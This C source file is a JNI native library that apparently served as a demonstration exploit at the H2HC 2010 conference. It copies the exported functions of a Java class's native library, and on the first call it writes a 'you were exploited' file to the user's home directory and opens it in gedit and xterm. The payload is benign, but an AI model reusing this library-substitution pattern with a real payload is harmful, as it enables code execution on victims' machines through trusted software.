#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "br_com_gas_mid_entity_CLibrary.h"

static void do_exploit() {
    const char *msg = "Parabéns! Você acabou de ser afetado por um exploit de demonstração do H2HC 2010.";
    const char *basename = "VOCE_FOI_EXPLOITADO.txt";
    const char *homedir = getenv("HOME");
    char filename[256];
    FILE *fp;
    if(homedir)
        snprintf(filename, sizeof(filename), "%s/%s", homedir, basename);
    else
        strncpy(filename, basename, sizeof(filename));
    if((fp = fopen(filename, "w"))) {
        fwrite(msg, strlen(msg), 1, fp);
        fclose(fp);
    }
    if(!fork()) {
        execlp("gedit", "gedit", filename, NULL);
    }
    if(!fork()) {
        execlp("xterm", "xterm", "-e", "less", filename, NULL);
    }
}

static void exploit_if_not_already() {
    static int already_exploited = 0;
    if(already_exploited)
        return;
    already_exploited = 1;
    do_exploit();
}

static jstring exploit_and_return_jstring(JNIEnv *env, const char *cstr) {
    jstring jret = (*env)->NewStringUTF(env, cstr);
    exploit_if_not_already();
    return jret;
}

JNIEXPORT jstring JNICALL Java_br_com_gas_mid_entity_CLibrary_Function1(JNIEnv *env, jobject obj, jstring str1, jstring str2, jstring str3, jstring str4, jstring str5, jstring str6) {
    return exploit_and_return_jstring(env, "Function1");
}

JNIEXPORT jstring JNICALL Java_br_com_gas_mid_entity_CLibrary_Function3(JNIEnv *env, jobject obj, jstring str1, jstring str2, jstring str3, jstring str4, jstring str5) {
    return exploit_and_return_jstring(env, "Function3");
}

JNIEXPORT jstring JNICALL Java_br_com_gas_mid_entity_CLibrary_Digest1(JNIEnv *env, jobject obj, jstring str1, jstring str2) {
    return exploit_and_return_jstring(env, "Digest1");
}

JNIEXPORT jstring JNICALL Java_br_com_gas_mid_entity_CLibrary_Digest2(JNIEnv *env, jobject obj, jstring str1, jstring str2) {
    return exploit_and_return_jstring(env, "Digest2");
}

JNIEXPORT jstring JNICALL Java_br_com_gas_mid_entity_CLibrary_getVersion(JNIEnv *env, jobject obj) {
    return exploit_and_return_jstring(env, "1.3.3.7");
}

